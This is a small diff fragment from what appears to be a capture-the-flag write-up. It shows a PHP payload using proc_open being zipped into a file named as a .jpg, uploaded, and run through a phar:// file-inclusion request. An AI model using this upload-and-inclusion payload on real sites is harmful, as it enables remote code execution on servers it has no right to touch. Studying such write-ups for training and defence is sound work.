@@ -275,7 +275,7 @@ $process = proc_open($command, $descriptors, $pipes);
 ?>
 ```
 
-Compressed it `zip dusk.jpg dusk.php`, uploaded the archive, and executed it.
+Compressed `zip dusk.jpg dusk.php`, uploaded, and executed the payload.
 
 ```
 ?page=phar://uploads/52955e2b0b45d0f0ae62921e2bf0a932/dusk.jpg/dusk
